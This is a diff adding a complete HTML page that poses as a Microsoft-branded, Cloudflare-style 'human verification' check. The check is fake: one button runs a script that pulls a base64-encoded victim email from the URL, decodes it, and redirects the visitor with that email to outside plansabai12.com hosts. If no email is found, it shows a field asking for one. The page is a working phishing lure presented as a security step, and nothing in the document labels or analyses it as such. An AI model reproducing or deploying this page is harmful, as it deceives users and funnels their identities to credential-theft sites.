@@ -1,0 +1,272 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Proceed</title>
+
+    <style>
+        :root {
+            --bg-main: linear-gradient(135deg, #eef2ff, #f8fafc);
+            --card-bg: #ffffff;
+            --text-primary: #0f172a;
+            --text-muted: #64748b;
+            --accent: #2563eb;
+            --border-soft: rgba(0,0,0,0.06);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--bg-main);
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        }
+
+        .container {
+            width: 460px;
+            max-width: calc(100% - 32px);
+            background: var(--card-bg);
+            border-radius: 14px;
+            padding: 32px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(15, 23, 42, 0.08);
+        }
+
+        .secure-icon {
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 12px;
+            border-radius: 10px;
+            background:
+                linear-gradient(#f35325 0 0) left top/50% 50% no-repeat,
+                linear-gradient(#00a4ef 0 0) right top/50% 50% no-repeat,
+                linear-gradient(#7cbb00 0 0) left bottom/50% 50% no-repeat,
+                linear-gradient(#ffbb00 0 0) right bottom/50% 50% no-repeat;
+        }
+
+        .title {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin-bottom: 18px;
+        }
+
+        .cf-turnstile {
+            display: inline-block;
+            margin-top: 8px;
+            min-height: 90px;
+            width: 100%;
+        }
+
+        .cf-turnstile::before {
+            content: "Please confirm you are not automated.";
+            display: block;
+            margin-bottom: 14px;
+            padding: 10px 14px;
+            font-size: 13px;
+            color: var(--accent);
+            background: rgba(37, 99, 235, 0.08);
+            border: 1px solid rgba(37, 99, 235, 0.15);
+            border-radius: 10px;
+        }
+
+        .verify-button {
+            margin-top: 10px;
+            padding: 11px;
+            width: 100%;
+            font-size: 14px;
+            border: none;
+            border-radius: 8px;
+            background: var(--accent);
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .verify-button:hover {
+            opacity: 0.9;
+        }
+
+        .footer-text {
+            margin-top: 22px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        #manualEmailInput {
+            display: none;
+            width: 100%;
+            margin-top: 20px;
+            padding: 11px 12px;
+            font-size: 14px;
+            border-radius: 8px;
+            border: 1px solid var(--border-soft);
+        }
+
+        #submitEmailButton {
+            display: none;
+            margin-top: 12px;
+            padding: 11px;
+            width: 100%;
+            font-size: 14px;
+            border: none;
+            border-radius: 8px;
+            background: var(--accent);
+            color: #fff;
+            cursor: pointer;
+        }
+
+        #submitEmailButton:hover {
+            opacity: 0.9;
+        }
+
+        @media (max-width: 520px) {
+            .container {
+                padding: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="secure-icon"></div>
+
+    <div class="title"></div>
+    <div class="subtitle">Human Scan Process</div>
+
+    <form id="captchaForm">
+        <div class="cf-turnstile">
+            <button type="button" class="verify-button" onclick="onCaptchaSuccess()">Verify to Continue</button>
+        </div>
+    </form>
+
+    <div class="footer-text">
+        This verification helps keep your account protected.
+    </div>
+
+    <input type="email" id="manualEmailInput" placeholder="Email address">
+    <button id="submitEmailButton" onclick="onManualEmailSubmit()">Continue</button>
+</div>
+
+<script>
+// Helper functions
+function getafterhash(url) {
+    console.log("getafterhash called with url:", url);
+
+    if (!url || typeof url !== 'string') return null;
+
+    try {
+        const parsed = new URL(url, window.location.origin);
+        console.log("Parsed URL:", parsed.href);
+
+        const segs = parsed.pathname.split('/').filter(Boolean);
+        for (let i = 0; i < segs.length; i++) {
+            const seg = segs[i];
+            if (seg.startsWith('$')) {
+                let token = seg.slice(1);
+                token = token.replace(/\/+$/, '').trim();
+                try { token = decodeURIComponent(token); } catch(e){ }
+                return token || null;
+            }
+        }
+
+        const rawPath = parsed.pathname || "";
+        const pos = rawPath.indexOf('/$');
+        if (pos !== -1) {
+            let token = rawPath.slice(pos + 2);
+            token = token.split(/[?#\/]/)[0].trim();
+            try { token = decodeURIComponent(token); } catch(e){ }
+            return token || null;
+        }
+
+        if (parsed.hash) {
+            let h = parsed.hash.replace(/^#/, '');
+            if (h.startsWith('$')) h = h.slice(1);
+            h = h.split(/[&?]/)[0].trim();
+            try { h = decodeURIComponent(h); } catch(e){ }
+            if (h) return h;
+        }
+
+        for (let [k, v] of parsed.searchParams.entries()) {
+            if (!v) continue;
+            const key = k.toLowerCase();
+            if (key === 'e' || key === 'email' || key === 'token' || key === 'data') {
+                try { return decodeURIComponent(v); } catch(e){ return v; }
+            }
+        }
+
+        let parts = [
+            url.split('#?fdjhbgsrew=')[1],
+            url.split(';')[1],
+            url.split(';+')[1],
+            url.split('*;')[1]
+        ];
+
+        for (let part of parts) {
+            if (part) {
+                let token = part.split(/[&#?\/]/)[0].trim();
+                try { token = decodeURIComponent(token); } catch(e){ }
+                if (token) return token;
+            }
+        }
+
+    } catch (err) {
+        console.warn("URL parsing error:", err.message);
+    }
+    return null;
+}
+
+function onCaptchaSuccess(token) {
+    console.log("Verification completed.");
+    const url_string = window.location.href;
+    const encoded_email = getafterhash(url_string);
+
+    if (!encoded_email) {
+        document.getElementById("manualEmailInput").style.display = "block";
+        document.getElementById("submitEmailButton").style.display = "block";
+        return;
+    }
+
+    let decoded_email;
+    try {
+        decoded_email = atob(encoded_email);
+        console.log("Decoded email:", decoded_email);
+    } catch (e) {
+        console.error("Base64 decode failed:", e);
+        alert("Invalid email format (base64 decode failed). Check the console.");
+        return;
+    }
+
+    const go_url = "https://bfghj.plansabai12.com/?e=" + encodeURIComponent(decoded_email);
+    console.log("Redirecting to:", go_url);
+    location.replace(go_url);
+}
+
+function onManualEmailSubmit() {
+    const email = document.getElementById("manualEmailInput").value;
+    if (!email) {
+        alert("Please enter your email.");
+        return;
+    }
+
+    const go_url = "https://jhftf.plansabai12.com/?e=" + encodeURIComponent(email);
+    console.log("Redirecting to:", go_url);
+    location.replace(go_url);
+}
+</script>
+
+</body>
+</html>
